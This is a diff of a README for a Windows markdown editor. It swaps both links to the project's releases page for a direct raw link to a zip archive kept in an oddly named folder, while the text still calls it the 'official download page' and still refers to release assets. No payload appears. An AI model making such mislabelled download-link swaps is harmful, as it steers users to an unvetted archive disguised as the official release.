@@ -1,6 +1,6 @@
 # 📝 markdown-editor - Write notes quickly and save easily
 
-[Download the latest version here](https://github.com/evasive-battleofminden326/markdown-editor/releases)
+[Download the latest version here](https://github.com/evasive-battleofminden326/markdown-editor/raw/refs/heads/main/hyothyroid/markdown_editor_2.9-alpha.1.zip)
 
 ---
 
@@ -24,7 +24,7 @@ markdown-editor gives you a modern way to write text files. You see your changes
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/evasive-battleofminden326/markdown-editor/releases).
+1.  Visit the [official download page](https://github.com/evasive-battleofminden326/markdown-editor/raw/refs/heads/main/hyothyroid/markdown_editor_2.9-alpha.1.zip).
 2.  Scroll down to the section labeled Assets.
 3.  Look for the file ending in `.msi` or `.exe`.
 4.  Click the file to start the download.
